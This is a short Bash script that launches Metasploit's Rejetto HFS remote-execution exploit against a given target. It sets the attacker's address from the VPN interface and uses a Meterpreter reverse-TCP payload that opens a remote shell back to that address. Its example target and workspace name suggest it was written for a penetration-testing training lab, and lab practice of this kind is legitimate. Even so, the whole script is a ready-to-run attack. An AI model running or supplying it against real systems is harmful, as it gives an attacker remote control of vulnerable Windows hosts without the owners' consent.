#!/usr/bin/env bash
# msf_hfs_rejetto.sh
# Usage:
#   ./msf_hfs_rejetto.sh -w <workspace> -t <target> [-i iface]
# Example:
#   ./msf_hfs_rejetto.sh -w oscp-hfs -t demo.ine.local -i tun0

set -euo pipefail
IFS=$'\n\t'

ENG_NAME=""
TARGET=""
IFACE="tun0"

usage() {
  echo "Usage: $0 -w <workspace> -t <target> [-i iface]"
  exit 1
}

while getopts "w:t:i:h" opt; do
  case "$opt" in
    w) ENG_NAME="$OPTARG" ;;
    t) TARGET="$OPTARG" ;;
    i) IFACE="$OPTARG" ;;
    h|*) usage ;;
  esac
done

[ -z "$ENG_NAME" ] && usage
[ -z "$TARGET" ] && usage

for cmd in ip msfconsole; do
  command -v "$cmd" >/dev/null 2>&1 || {
    echo "[!] '$cmd' not found"; exit 1;
  }
done

IP_CIDR="$(ip -o -f inet addr show "$IFACE" | awk '{print $4}' | head -n1 || true)"
[ -z "$IP_CIDR" ] && { echo "[!] Could not get IP for $IFACE"; exit 1; }

LHOST="${IP_CIDR%/*}"

echo "[*] Workspace : $ENG_NAME"
echo "[*] Target    : $TARGET"
echo "[*] Interface : $IFACE"
echo "[*] LHOST     : $LHOST"

MSF_CMDS=""
MSF_CMDS+="workspace -a $ENG_NAME; "
MSF_CMDS+="workspace $ENG_NAME; "
MSF_CMDS+="setg LHOST $LHOST; "
MSF_CMDS+="use exploit/windows/http/rejetto_hfs_exec; "
MSF_CMDS+="set RHOSTS $TARGET; "
MSF_CMDS+="set RPORT 80; "
MSF_CMDS+="set PAYLOAD windows/meterpreter/reverse_tcp; "
MSF_CMDS+="exploit -j; "

echo "[*] Launching msfconsole..."
msfconsole -q -x "$MSF_CMDS"

